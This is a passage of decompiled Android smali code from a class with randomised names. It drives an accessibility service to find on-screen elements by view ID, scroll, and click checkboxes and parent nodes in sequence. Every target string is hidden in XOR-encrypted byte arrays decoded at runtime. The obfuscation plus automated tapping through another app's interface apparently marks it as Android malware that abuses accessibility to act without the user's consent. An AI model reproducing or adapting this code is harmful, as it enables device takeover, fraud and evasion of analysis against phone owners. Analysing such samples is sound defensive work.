        0x4t
        0x10t
        -0x2t
        0x11t
        -0x3et
        -0x4ct
    .end array-data

    :array_1
    .array-data 1
        -0x25t
        -0xft
        0x6dt
        0x7ct
        -0x73t
        0x45t
        -0x53t
        -0x3ct
    .end array-data

    :array_2
    .array-data 1
        -0x7t
        -0x31t
        -0x2ft
        0x5ct
        -0x65t
        -0x6bt
        -0x6ft
        -0x30t
        -0x17t
        -0x72t
        -0x34t
        0x1dt
        -0x7dt
        -0x80t
        -0x71t
        -0x38t
        -0x5t
        -0x32t
        -0x23t
        0x15t
        -0x6ft
        -0x69t
        -0x2dt
        -0x3dt
        -0x11t
        -0x3bt
        -0x30t
        0x15t
        -0x6bt
        -0x70t
        -0x68t
        -0x75t
        -0x36t
        -0x31t
        -0x35t
        0x17t
        -0x7at
        -0x5at
        -0x6et
        -0x35t
        -0x12t
        -0x2et
        -0x2dt
        0x1et
        -0x4bt
        -0x7at
        -0x77t
        -0x34t
        -0x14t
        -0x37t
        -0x38t
        0xbt
    .end array-data

    :array_3
    .array-data 1
        -0x66t
        -0x60t
        -0x44t
        0x72t
        -0xct
        -0x1bt
        -0x3t
        -0x5bt
    .end array-data

    :array_4
    .array-data 1
        -0x45t
        0x70t
        0x58t
        0x7bt
        -0x41t
        -0x5et
        -0x1ft
        0x61t
        -0x56t
        0x70t
        0x46t
        0x7bt
        -0x54t
        -0x5et
        -0x6t
        0x6bt
        -0x56t
        0x72t
        0x54t
        0x3bt
        -0x43t
        -0x56t
        -0x18t
        0x7ct
        -0xat
        0x79t
        0x40t
        0x30t
        -0x50t
        -0x56t
        -0x14t
        0x7bt
        -0x43t
        0x31t
        0x65t
        0x3at
        -0x55t
        -0x58t
        -0x1t
        0x4dt
        -0x49t
        0x71t
        0x41t
        0x27t
        -0x4dt
        -0x5ft
        -0x34t
        0x6dt
        -0x54t
        0x76t
        0x43t
        0x3ct
        -0x58t
        -0x4ct
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x28t
        0x1ft
        0x35t
        0x55t
        -0x24t
        -0x33t
        -0x73t
        0xet
    .end array-data
.end method

.method private static E1()V
    .locals 7

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x18

    const/16 v3, 0x1f4

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v4

    if-eqz v4, :cond_2

    sget-object v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v5, v2, [B

    fill-array-data v5, :array_3

    invoke-static {v1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v4, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v4, 0x30

    new-array v5, v4, [B

    fill-array-data v5, :array_4

    new-array v6, v2, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    :goto_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->F1()V

    goto/16 :goto_1

    :cond_1
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->c3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v4, [B

    fill-array-data v1, :array_6

    new-array v2, v2, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    add-int/lit8 v1, v1, -0x1

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    goto :goto_0

    :cond_2
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v4, 0x29

    new-array v4, v4, [B

    fill-array-data v4, :array_8

    new-array v5, v2, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x38

    new-array v1, v1, [B

    fill-array-data v1, :array_a

    new-array v2, v2, [B

    fill-array-data v2, :array_b

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    add-int/lit8 v1, v1, -0x1

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    goto/16 :goto_0

    :cond_3
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_c

    new-array v2, v2, [B

    fill-array-data v2, :array_d

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ny;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ny;-><init>()V

    invoke-interface {v0, v1}, Ljava/lang/Iterable;->forEach(Ljava/util/function/Consumer;)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qq;->d:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/oy;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/oy;-><init>()V

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_1

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Z2()V

    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        -0x11t
        -0xet
        0x56t
        0x6ct
        -0x66t
        0x5ft
        0x76t
        0x42t
        -0x1t
        -0x4dt
        0x59t
        0x23t
        -0x7ft
        0x5bt
        0x7ft
        0x45t
        -0xbt
        -0x59t
        0x52t
        0x26t
        -0x26t
        0x5dt
        0x7ft
        0x54t
        -0xbt
        -0x2t
        0x57t
        0x27t
        -0x79t
        0x70t
        0x6ct
        0x5et
        -0x17t
        -0x16t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x74t
        -0x63t
        0x3bt
        0x42t
        -0xbt
        0x2ft
        0x1at
        0x37t
    .end array-data

    :array_2
    .array-data 1
        0x5bt
        -0x19t
        0x6et
        0x1et
        -0x2dt
        -0x7ct
        -0xct
        0x29t
        0x53t
        -0x13t
        0x25t
        0x1ft
        -0x35t
        -0x7ct
        -0x1ct
        0x70t
        0x52t
        -0x2at
        0x7dt
        0x5t
        -0x28t
        -0x76t
        -0xbt
        0x67t
    .end array-data

    :array_3
    .array-data 1
        0x3at
        -0x77t
        0xat
        0x6ct
        -0x44t
        -0x13t
        -0x70t
        0x13t
    .end array-data

    :array_4
    .array-data 1
        0x24t
        -0x3ft
        0x0t
        -0x24t
        0xft
        -0x1bt
        0x23t
        0x29t
        0x34t
        -0x80t
        0xft
        -0x6dt
        0x14t
        -0x1ft
        0x2at
        0x2et
        0x3et
        -0x6ct
        0x4t
        -0x6at
        0x4ft
        -0xat
        0x20t
        0x29t
        0x2et
        -0xft
        0x1dt
        -0x80t
        0x5t
        -0xdt
        0x2at
        0x2et
        0x22t
        -0x40t
        0xet
        -0x69t
        0x3ft
        -0x1et
        0x26t
        0x38t
        0x20t
        -0x35t
        0x19t
        -0x53t
        0xat
        -0x20t
        0x22t
        0x2ct
    .end array-data

    :array_5
    .array-data 1
        0x47t
        -0x52t
        0x6dt
        -0xet
        0x60t
        -0x6bt
        0x4ft
        0x5ct
    .end array-data

    :array_6
    .array-data 1
        -0x5t
        -0x17t
        0x70t
        -0x20t
        -0x4ct
        -0x29t
        -0x7ft
        -0x32t
        -0x15t
        -0x58t
        0x7ft
        -0x51t
        -0x51t
        -0x2dt
        -0x78t
        -0x37t
        -0x1ft
        -0x44t
        0x74t
        -0x56t
        -0xct
        -0x3ct
        -0x7et
        -0x32t
        -0xft
        -0x27t
        0x6dt
        -0x44t
        -0x42t
        -0x3ft
        -0x78t
        -0x37t
        -0x3t
        -0x18t
        0x7et
        -0x55t
        -0x7ct
        -0x30t
        -0x7ct
        -0x21t
        -0x1t
        -0x1dt
        0x69t
        -0x6ft
        -0x4ft
        -0x2et
        -0x80t
        -0x35t
    .end array-data

    :array_7
    .array-data 1
        -0x68t
        -0x7at
        0x1dt
        -0x32t
        -0x25t
        -0x59t
        -0x13t
        -0x45t
    .end array-data

    :array_8
    .array-data 1
        0x7et
        0x25t
        -0x3t
        -0x5et
        -0x7et
        -0x13t
        0x5t
        -0x6at
        0x6ft
        0x25t
        -0x1dt
        -0x5et
        -0x72t
        -0xet
        0x19t
        -0x6at
        0x7at
        0x3ft
        -0xft
        -0x2t
        -0x7bt
        -0x19t
        0x5t
        -0x61t
        0x27t
        0x23t
        -0xct
        -0x5dt
        -0x6dt
        -0x19t
        0xat
        -0x80t
        0x7et
        0x26t
        -0xbt
        -0x2t
        -0x42t
        -0xct
        0x0t
        -0x64t
        0x6at
    .end array-data

    nop

    :array_9
    .array-data 1
        0x1dt
        0x4at
        -0x70t
        -0x74t
        -0x1ft
        -0x7et
        0x69t
        -0x7t
    .end array-data

    :array_a
    .array-data 1
        0x62t
        0x3ct
        -0x35t
        -0x27t
        0x3et
        0xct
        -0x75t
        -0x2bt
        0x73t
        0x3ct
        -0x2bt
        -0x27t
        0x32t
        0x13t
        -0x69t
        -0x2bt
        0x66t
        0x26t
        -0x39t
        -0x7bt
        0x39t
        0x6t
        -0x75t
        -0x24t
        0x3bt
        0x3at
        -0x3et
        -0x28t
        0x3et
        0xct
        -0x75t
        -0x2bt
        0x73t
        0xct
        -0x2at
        -0x7bt
        0x38t
        0x5t
        -0x7et
        -0x38t
        0x64t
        0x3dt
        -0x3bt
        -0x6et
        0x2t
        0x14t
        -0x72t
        -0x22t
        0x66t
        0x36t
        -0x2et
        -0x58t
        0x37t
        0x16t
        -0x76t
        -0x36t
    .end array-data

    :array_b
    .array-data 1
        0x1t
        0x53t
        -0x5at
        -0x9t
        0x5dt
        0x63t
        -0x19t
        -0x46t
    .end array-data

    :array_c
    .array-data 1
        0xdt
        -0x20t
        0x58t
        -0x42t
        -0x5bt
        0x4ft
        0x59t
        -0x5et
        0x5t
        -0x16t
        0x13t
        -0x41t
        -0x43t
        0x4ft
        0x49t
        -0x5t
        0x4t
        -0x2ft
        0x4bt
        -0x5bt
        -0x52t
        0x41t
        0x58t
        -0x14t
    .end array-data

    :array_d
    .array-data 1
        0x6ct
        -0x72t
        0x3ct
        -0x34t
        -0x36t
        0x26t
        0x3dt
        -0x68t
    .end array-data
.end method

.method private static synthetic E2()V
    .locals 0

    .line 1
    return-void
.end method

.method public static synthetic F(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->B2(Landroid/content/Context;)V

    return-void
.end method

.method private static F0()V
    .locals 4

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x24

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/16 v3, 0x25

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    const/16 v2, 0x3e8

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    add-int/lit8 v1, v1, -0x1

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    :goto_0
    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_1

    :cond_0
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_1

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    :goto_1
    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v1

    if-eqz v1, :cond_3

    const/16 v1, 0x1f4

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x63

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->K0()V

    goto :goto_2

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V

    :cond_3
    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        0x5bt
        -0x7ft
        0xct
        0x6ft
        -0x1et
        -0x6et
        -0x42t
        0x2at
        0x5dt
        -0x79t
        0x4ft
        0x32t
        -0xdt
        -0x6ct
        -0x55t
        0x38t
        0x55t
        -0x7dt
        0x0t
        0x2ft
        -0x15t
        -0x80t
        -0x46t
        0x2ft
        0x2t
        -0x79t
        0x5t
        0x6et
        -0x7t
        -0x70t
        -0x4at
        0x29t
        0x5bt
        -0x7at
        0x4t
        0x33t
    .end array-data

    :array_1
    .array-data 1
        0x38t
        -0x12t
        0x61t
        0x41t
        -0x76t
        -0x19t
        -0x21t
        0x5dt
    .end array-data

    :array_2
    .array-data 1
        0x26t
        0x2at
        -0x5ft
        0x6at
        -0x53t
        0x76t
        -0x48t
        0x73t
        0x2bt
        0x2at
        -0x42t
        0x6at
        -0x4at
        0x66t
        -0x5dt
        0x68t
        0x20t
        0x28t
        -0x5ft
        0x25t
        -0x55t
        0x7et
        -0x49t
        0x79t
        0x37t
        0x7ft
        -0x5bt
        0x20t
        -0x16t
        0x6ct
        -0x59t
        0x75t
        0x31t
        0x26t
        -0x5ct
        0x21t
        -0x49t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x45t
        0x45t
        -0x34t
        0x44t
        -0x3bt
        0x1ft
        -0x30t
        0x1ct
    .end array-data
.end method

.method private static F1()V
    .locals 13

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x29

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_0
    const/4 v1, 0x6

    const/4 v3, -0x1

    const/4 v4, 0x0

    const/4 v5, 0x3

    const/4 v6, 0x2

    const/4 v7, 0x1

    const/16 v8, 0x1f4

    :try_start_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v9

    if-ne v9, v7, :cond_2

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v10

    invoke-virtual {v10, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v10

    invoke-virtual {v10, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v10

    if-eqz v10, :cond_1

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v11

    if-eqz v11, :cond_1

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v10

    if-eqz v10, :cond_1

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v10

    invoke-static {v10}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    goto :goto_0

    :catch_0
    move-exception v9

    move v10, v3

    goto :goto_3

    :cond_1
    :goto_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move v10, v3

    goto :goto_1

    :cond_2
    const/4 v10, 0x4

    if-ne v9, v10, :cond_4

    :cond_3
    move v10, v6

    goto :goto_1

    :cond_4
    if-ne v9, v1, :cond_5

    move v10, v5

    goto :goto_1

    :cond_5
    if-le v9, v10, :cond_3

    :goto_1
